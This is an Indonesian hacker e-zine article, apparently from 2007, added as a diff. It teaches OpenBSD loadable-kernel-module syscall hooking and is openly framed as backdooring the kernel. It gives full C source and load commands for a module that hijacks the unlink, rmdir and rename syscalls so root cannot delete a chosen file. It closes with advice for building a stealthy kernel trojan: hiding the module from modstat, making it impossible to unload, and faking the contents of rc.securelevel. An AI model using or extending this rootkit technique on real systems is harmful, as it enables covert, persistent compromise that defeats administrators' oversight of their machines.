@@ -1,0 +1,429 @@
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak-elektronik.net
+Contact	  : staff@kecoak-elektronik.net
+####################################################################
+
+
+Subject	  : Fun With OpenBSD Loadable Kernel Module
+Writer	  : Ph03n1X of Kecoak Elektronik
+Contact   : phoenix@kecoak-elektronik.net
+Style     : Unicode Transformation Format (UTF-8)
+
+
+--[1]-- Kecoak Elektronik License
+
+Kecoak Elektronik secara aktif mendukung Blue Ribbon Campaign.
+Kami akan berusaha untuk menerbitkan semua informasi yang kami anggap
+patut diketahui, baik dokumen teks, artikel majalah, atau surat kabar.
+Seluruh kredit akan diberikan kepada sang pengarang.
+
+Kecoak Elektronik tidak bertanggung jawab atas tindakan orang lain.
+Informasi yang disajikan di situs ini adalah untuk tujuan pendidikan
+dan informasionil belaka. Jika anda memutuskan untuk mengejawantahkan
+dalam bentuk apapun informasi yang tersimpan di situs ini, anda
+melakukan atas keputusan sendiri, dan tidak seorangpun selain anda
+bertanggung jawab atas tindakan tersebut.
+
+Dipersilahkan untuk mengambil sebagian atau seluruh dari isi artikel
+yang kami terbitkan dengan tetap mencantumkan kredit atas pengarang
+dan Kecoak Elektronik sebagai penerbit online. Artikel yang dikutip
+atau diambil tidak dapat dipergunakan untuk kepentingan komersil.
+
+
+--[2] Introduction
+
+OpenBSD merupakan sistem operasi varian unix Berkeley Software
+Distribution. OpenBSD sering sekali menjadi pilihan administrator
+untuk dijadikan sebagai mesin servernya karena memiliki banyak sekali
+keunggulan mulai dari stabilitas kernel sampai kemudahan untuk
+melakukan administrasi sistemnya. Salah satu keunggulan sistem
+operasi ini yang paling menojol dibanding sistem operasi yang lain
+adalah dalam hal sekuritas. Di official website OpenBSD 
+http://openbsd.org sangat jelas bahwa developer dan leader proyek
+OpenBSD - Theo de Raadt - sangat mengutamakan keamanan sistem
+operasi ini.
+
+"Only two remote holes in the default install, in more than 10 years!"
+
+Jika anda tertarik untuk menggunakan sistem operasi ini anda bisa
+memperoleh nya secara free di official websitenya. Tentu saja
+dengan lengkapnya dokumentasi yang disediakan harusnya bisa membuat
+siapapun mudah mempelajari sistem operasi ini.
+
+
+--[3] LKM -> Loadable Kernel Module
+
+Saya yakin sebagian pembaca disini pernah mendengar istilah
+kernel modular dan kernel monolitik. Kernel monolitik mempunyai
+keunggulan dalam hal sekuritas namun tidak fleksible sehingga jarang
+digunakan. Kernel modular terdiri dari modul-modul kernel yang dapat
+secara dinamik dipasang dan dilepas dari kernel. Modul-modul kernel
+yang bisa dipasang dan dilepas ini sering disebut dengan modul
+kernel loadable - Loadable Kernel Module (LKM).
+
+Sebagai contoh driver-driver hardware biasanya di insertkan kedalam
+kernel dalam bentuk module. Karena sifatnya yang dinamik ini kernel
+modular bisa disisipi modul 'jahat' untuk keperluan seperti
+backdooring kernel. Di artikel ini saya mencoba sedikit menjelaskan
+bagaimana bermain-main dengan module kernel openbsd untuk mengambil
+keuntungan dari modul-modul yang disisipkan ke kernel. Module-module
+kernel dapat dibagi kedalam 5 kelompok umum:
+
+-----------------------------------------------------------------------
+* Modul System Call
+* Modul Virtual File System
+* Modul Device Drive
+* Modul Execution Interpreter
+* Modul Miscellaneous
+-----------------------------------------------------------------------
+CATATAN : Artikel ini hanya membahas serangan terhadap syscall OpenBSD
+          menggunakan LKM.
+
+
+--[4]-- Memulai OpenBSD LKM
+
+Untuk memulai bermain-main dengan OpenBSD LKM ada beberapa hal yang
+harus disiapkan karena default install OpenBSD tidak mengizinkan
+penambahan modul dari /etc/rc.securelevel. Agar penambahan module
+diizinkan silakan nilai dari securelevel=1 di /etc/rc.securelevel
+diganti menjadi securelevel=-1.
+
+Pastikan juga anda mempunyai source code kernel di /usr/src/sys,
+jika belum anda bisa mendownload sys.tar.gz dari link dibawah ini
+ftp://ftp.openbsd.org/pub/OpenBSD/$(uname -r)/sys.tar.gz
+
+Selanjutnya, anda juga perlu mengerti bagaimana bekerja dengan
+perintah modload, modstat, dan modunload. Untuk lebih lengkap,
+bagaimana menggunakan perintah-perintah tersebut silakan dibaca
+manual pagesnya, namun secara umum penggunaan perintah itu adalah\
+
+-----------------------------------------------------------------------
+modload  - untuk menginsertkan modul kedalam kernel.
+modunload - untuk melepas modul dari kernel.
+modstat  - untuk melihat modul apa saja yang diload dalam kernel
+-----------------------------------------------------------------------
+
+
+--[5]-- OpenBSD Syscall Tracking
+
+Saat kita mengekskusi perintah-perintah di OpenBSD sebenarnya kita
+memanggil system call-system call tertentu. System call apa saja yang
+digunakan bisa kita track melalui perintah 'ktrace' dan 'kdump'.
+Tracking dilakukan menggunakan perintah ktrace, namun output ktrace
+tidak human readable. Untuk membaca output ktrace digunakan perintah
+'kdump'. Berikut sebuah contoh untuk mengetahui syscall apa saja yang
+dipanggil saat menghapus sebuah file dengan 'rm -f'
+
+example: rm -f fileku
+
+openbsd# touch fileku
+openbsd# ktrace rm -f fileku
+openbsd# kdump -f ktrace.out
+
+ 27902 ktrace   RET   ktrace 0
+ 27902 ktrace   CALL  execve(0xcfbe4890,0xcfbe4de0,0xcfbe4df0)
+ 27902 ktrace   NAMI  "/sbin/rm"
+ 27902 ktrace   RET   execve -1 errno 2 No such file or directory
+ 27902 ktrace   CALL  execve(0xcfbe4890,0xcfbe4de0,0xcfbe4df0)
+ 27902 ktrace   NAMI  "/usr/sbin/rm"
+ 27902 ktrace   RET   execve -1 errno 2 No such file or directory
+ 27902 ktrace   CALL  execve(0xcfbe4890,0xcfbe4de0,0xcfbe4df0)
+ 27902 ktrace   NAMI  "/bin/rm"
+ 27902 rm       EMUL  "native"
+ 27902 rm       RET   execve 0
+ 27902 rm       CALL  __sysctl(1.37,0x3c0054a0,0xcfbc7f1c,0,0)
+ 27902 rm       RET   __sysctl 0
+ 27902 rm       CALL  __sysctl(1.37,0x3c0054a4,0xcfbc7f1c,0,0)
+ 27902 rm       RET   __sysctl 0
+ 27902 rm       CALL  __sysctl(1.37,0x3c0054a8,0xcfbc7f1c,0,0)
+ 27902 rm       RET   __sysctl 0
+ 27902 rm       CALL  __sysctl(1.37,0x3c0054ac,0xcfbc7f1c,0,0)
+ 27902 rm       RET   __sysctl 0
+ 27902 rm       CALL  __sysctl(1.37,0x3c0054b0,0xcfbc7f1c,0,0)
+ 27902 rm       RET   __sysctl 0
+ 27902 rm       CALL  __sysctl(1.37,0x3c0054b4,0xcfbc7f1c,0,0)
+ 27902 rm       RET   __sysctl 0
+ 27902 rm       CALL  __sysctl(1.37,0x3c0054b8,0xcfbc7f1c,0,0)
+ 27902 rm       RET   __sysctl 0
+ 27902 rm       CALL  __sysctl(1.37,0x3c0054bc,0xcfbc7f1c,0,0)
+ 27902 rm       RET   __sysctl 0
+ 27902 rm       CALL  __sysctl(6.7,0x3c00f424,0xcfbc7f2c,0,0)
+ 27902 rm       RET   __sysctl 0
+ 27902 rm       CALL  mmap(0,0x1000,0x3,0x1002,0xffffffff,0,0,0)
+ 27902 rm       RET   mmap -1977610240/0x8a201000
+ 27902 rm       CALL  mprotect(0x8a201000,0x1000,0x1)
+ 27902 rm       RET   mprotect 0
+ 27902 rm       CALL  issetugid()
+ 27902 rm       RET   issetugid 0
+ 27902 rm       CALL  ioctl(0,TIOCGETA,0xcfbc7ec0)
+ 27902 rm       RET   ioctl 0
+ 27902 rm       CALL  lstat(0xcfbc80ea,0xcfbc7e80)
+ 27902 rm       NAMI  "fileku"
+ 27902 rm       RET   lstat 0
+ 27902 rm       CALL  unlink(0xcfbc80ea)
+ 27902 rm       NAMI  "fileku"
+ 27902 rm       RET   unlink 0
+ 27902 rm       CALL  munmap(0x8a201000,0x1000)
+ 27902 rm       RET   munmap 0
+ 27902 rm       CALL  exit(0)
+
+Bisa dilihat bahwa penghapusan file menggunakan 'rm -f' melakukan
+pemanggilan syscall 'SYS_unlink'. Anda bisa bermain-main sendiri
+menggunakan ktrace dan kdump untuk mengetahui syscall apa saja yang
+digunakan dalam ekskusi sebuah perintah.
+
+
+--[6]-- File-file Fungsi Syscall dan Header Syscall
+
+Layaknya pemrograman user interface, pemrograman modul syscall
+pada kernel OpenBSD juga membutuhkan beberpa file header dan
+file C source yang sebaiknya dipelajari agar nantinya tidak bingung
+membaca modul syscall. 
+
+* /usr/src/sys/kern/syscalls.c - berisi tabel nama-nama syscall OpenBSD.
+* /usr/src/sys/kern/init_sysent.c - berisi tabel sysent yang menyimpan dua
+  informasi : Jumlah parameter system call dan fungsi yang menghandle 
+  system call.
+* /usr/src/sys/sys/syscallargs.h - berisi list argument system call.
+* /usr/src/sys/sys/syscall.h - berisi nomor sistem call
+
+Setelah anda membaca dan memahami file-file di atas, sekarang saatnya
+anda memulai mengkode system call anda, melakukan editing system call
+dan mengambil keuntungan-keuntungan sekuritas level kernel.
+
+
+--[7]-- System call Editing for Fun and Profit :)
+
+Sudah dijelaskan sebelumnya bahwa saat kita mengeksekusi sebuah
+perintah, kita memanggil system call tertentu. Bagaimana jika kita
+melakukan editing system call? Tentu saja kita bisa mengontrol output
+dari perintah yang di eksekusi oleh user di sistem itu. Banyak hal yang
+bisa dilakukan dengan melakukan editing system call, misalnya:
+
+1. Menyembunyikan file dari perintah 'ls'
+2. Menyembunyikan proses
+3. Meredireksi ekskusi sebuah file
+4. Membuat file yang tidak bisa di delete
+5. Membuat proses yang tidak bisa di 'kill'
+6. Menyembunyikan socket dari perintah seperti 'netstat'
+7. Anda bisa membuat sebuah user yang memiliki pangkat lebih dari root.
+
+Saya tidak mungkin menjelaskan semua itu, selain karena saya malas
+sekali membuatnya juga karena keterbatasan ilmu saya (cool..)
+
+Well, berikut saya contohkan sebuah modul untuk mencegah pemindahan
+sebuah file baik karena perintah 'rm','rmdir', mapun 'mv'. Kalo anda
+bertanya kok cuma itu saja? Karena itulah yang paling sederhana dan
+saya yakin contoh ini jauh membantu para newbie dibandingkan jika
+saya memberikan contoh yang keren tapi susah dipahami.
+
+Jika anda melakukan tracking, dengan ktrace dan kdump anda akan
+mendapatkan hal-hal berikut.
+
+-----------------------------------------------------------------------
+SYS_unlink dipanggil saat penghapusan file menggunakan 'rm'.
+SYS_rmdir dipanggil saat penghapusan directory menggunakan 'rmdir' atau 'rm -rf'.
+SYS_rename dipanggil saat dilakukan pemindahan file/directory menggunakan 'mv'.
+-----------------------------------------------------------------------
+
+Mungkin anda sering mendapati hasil 'permission denied' saat mengeksekusi
+sebuah perintah. Hal ini dikarenakan ada system call yang dipanggil saat
+eksekusi perintah yang memberikan nilai balik EACCES. Jadi kesimpulannya,
+ketika kita menginginkan sebuah file misalnya file dengan nama 'kecoak'
+tidak bisa dihapus/dipindah kita cukup memberikan nilai balik EACCES
+untuk syscall SYS_unlink, SYS_rmdir, SYS_rename saat syscall itu
+memperoleh inputan 'kecoak'
+(Joke : kecoak belum pernah terhapus sejak awal berdirikan :) )
+
+Pasti anda sadah bosan mendengar ocehan konsep sayakan? Saya tahu,
+waktu awal saya belajar juga males baca konsep, tapi tahukah anda
+tanpa konsep anda tidak mungkin kreatif, tanpa konsep anda hanya akan
+jadi orang tolol dan murahan - (nyolong omongan scut), lebih penting
+lagi jika anda biasa berkomunikasi dengan orang awam pasti anda sadar
+bahwa mereka lebih seneng diceritain konseptual daripada teknis
+karena selain mudah dipahami anda juga terlihat lebih berwibawa!.
+DoohhHh, uda bosen gini malah dimarahi?! x-(
+hmmmm, ni diya potongan codenya :)
+
+-----------------------------------------------------------------------
+
+/*
+Simple Code ini dibuat oleh Ph03n1X of KEI
+Email : phoenix@kecoak-elektronik.net
+Code ini adalah PoC kernel modul syscall untuk mencegah penghapusan/pemidahan
+file atau directory 'kecoak' oleh semua user termasuk root.
+*/
+
+#include <sys/param.h>
+#include <sys/systm.h>
+#include <sys/conf.h>
+#include <sys/exec.h>
+#include <sys/lkm.h>
+#include <sys/proc.h>
+#include <sys/syscall.h>
+#include <sys/namei.h>
+#include <sys/filedesc.h>
+#include <sys/stat.h>
+#include <sys/vnode.h>
+#include <sys/mount.h>
+#include <sys/syscallargs.h>
+#define FNAME "kecoak"
+
+int (*orig_unlink) (struct proc * p, void * v, register_t retval);
+int (*orig_rename) (struct proc * p, void * v, register_t retval);
+int (*orig_rmdir) (struct proc * p, void * v, register_t retval);
+
+MOD_MISC("k_unlink");
+//Mungkin anda bertanya disini kok MOD_MISC ga MOD_SYSCALL??
+//Katanya modul syscall mbah??Cari tau dengan jarimu!
+
+int my_unlink(struct proc *p, void * v, register_t retval) {
+
+        register struct sys_unlink_args * uap = v;
+        if(strncmp(SCARG(uap, path), FNAME, sizeof(FNAME))==0)
+        {
+                return EACCES;
+        }
+        else
+        {
+                return(orig_unlink(p,v,retval));
+        }
+}
+
+int my_rmdir(struct proc *p, void * v, register_t retval) {
+
+        register struct sys_rmdir_args * uap = v;
+        if(strncmp(SCARG(uap, path), FNAME, sizeof(FNAME))==0)
+        {
+                return EACCES;
+        }
+        else
+        {
+                return(orig_rmdir(p,v,retval));
+        }
+}
+
+int my_rename(struct proc *p, void * v, register_t retval) {
+
+        register struct sys_rename_args * uap = v;
+        if(strncmp(SCARG(uap, from), FNAME, sizeof(FNAME))==0)
+        {
+                return EACCES;
+        }
+        else
+        {
+                return(orig_rename(p,v,retval));
+        }
+}
+
+int handler (struct lkm_table * lkmtp, int cmd) {
+switch(cmd)
+{
+case LKM_E_LOAD:
+        printf("modifikasi syscall\n");
+        (sy_call_t *)orig_unlink = sysent[SYS_unlink].sy_call; 
+        sysent[SYS_unlink].sy_call = (sy_call_t *)my_unlink;
+        (sy_call_t *)orig_rename = sysent[SYS_rename].sy_call;
+        sysent[SYS_rename].sy_call = (sy_call_t *)my_rename;
+        (sy_call_t *)orig_rmdir = sysent[SYS_rmdir].sy_call;
+        sysent[SYS_rmdir].sy_call = (sy_call_t *)my_rmdir;
+	break;
+
+case LKM_E_UNLOAD:
+        printf("kembali ke syscall default\n");
+        sysent[SYS_unlink].sy_call = (sy_call_t *)orig_unlink; 
+        sysent[SYS_rename].sy_call = (sy_call_t *)orig_rename;
+        sysent[SYS_rmdir].sy_call = (sy_call_t *)orig_rmdir;
+	break;
+
+case LKM_E_STAT:
+        printf("syscallnya uda berubah .\n"); 
+        break; 
+} 
+return 0; 
+}
+
+int k_unlink (struct lkm_table * lkmtp, int cmd, int ver) 
+{
+        DISPATCH(lkmtp, cmd, ver, handler, handler, lkm_nofunc); 
+}
+
+-----------------------------------------------------------------------
+//KOMPILASI
+//cc -D_KERNEL -I/sys -c lkm_obsd.c
+//modload -o k_unlink.o -ek_unlink lkm_obsd.o
+
+
+Cara pasang modulnya ke kernel 
+-----------------------------------------------------------------------
+[root@kecoak]# cc -D_KERNEL -I/sys -c lkm_obsd.c
+[root@kecoak]# modload -o k_unlink.o -ek_unlink lkm_obsd.o
+Module loaded as ID 0
+[root@kecoak]#
+[root@kecoak]# modstat
+Type     Id Off Loadaddr Size Info     Rev Module Name
+MISC      0   0 e3767000 0001 e37672bc   2 k_unlink
+[root@kecoak]# id
+uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
+[root@kecoak]# touch kecoak
+[root@kecoak]# rm -fr kecoak
+rm: kecoak: Permission denied
+[root@kecoak]# mv kecoak kandang
+mv: rename kecoak to kandang: Permission denied
+-----------------------------------------------------------------------
+
+Mudahkan?? Iya, karena contohnya mudah. Namun jika anda benar-benar
+tertarik mendevelope sebuah openbsd kernel trojan ada beberapa catatan
+sebagai saran:
+
+1. Redireksi eksekusi untuk melihat isi atau mengedit /etc/rc.securelevel 
+   ke file lain misalnya ketika seorang user mengisukan perintah
+   'cat /etc/rc.securelevel' maka teruskan ke /etc/rc.securelevel.old.
+   Perlu diperhatikan bahwa rc.securelevel.old isinya harus sama persis
+   dengan rc.securelevel sebelum anda edit untuk keperluan meload modul kernel.
+
+2. Sembunyikan module anda dari perintah 'modstat' dan buat supaya
+   modulenya tidak bisa di unload oleh perintah 'modunload'.
+
+3. Isi dan fungsi dari trojan terserah anda saja, sesuaikan keperluan
+   tapi akan sangat baik jika modul melakukan pengeditan syscall
+   yang berperan untuk menyembunyikan file dan proses-proses ilegal anda.
+
+4. Belajar, karena pasti ada kekurangan dari saran yang saya sebutkan diatas :)
+   belum lagi apa yang saya sampaikan juga sangat terbatas.
+
+
+--[8]-- Penutup
+
+Learn how to love hacking or turn off your computer !!
+We're still alive to sniff the invisible wire
+We're still alive to sniff the air for trouble
+Viva la cucaracha !!
+
+
+--[9]-- Referensi
+
+Permohonan maaf bagi yang menjadi penulis artikel-artikel berikut
+karena saya lupa link aslinya dimana. Semua artikel ini masih asli
+dan tidak saya lakukan editing sama sekali mudah-mudahan bisa jadi
+tambahan suplement reading anda
+
+http://www.kandangjamur.net/private/openbsd/
+
+Link lain yang saya pakai
+
+1. http://www.securitylab.ru/53666.html (part 1)
+2. http://www.securitylab.ru/54294.html (part 2)
+3. http://fxr.watson.org/fxr/source/kern/kern_prot.c?v=OPENBSD
+4. http://www.infoshackers.com/Archives/Docs/Articles%20THJ/Manuel/lkm_bsd_1.txt
+
+
+
+Salam,
+Ph03n1X <phoenix@kecoak-elektronik.net>
+-----------------------------------------------------------------------
+Copyleft Unreserved by Law 1995 - 2007 Kecoak Elektronik Indonesia
+http://www.kecoak-elektronik.net
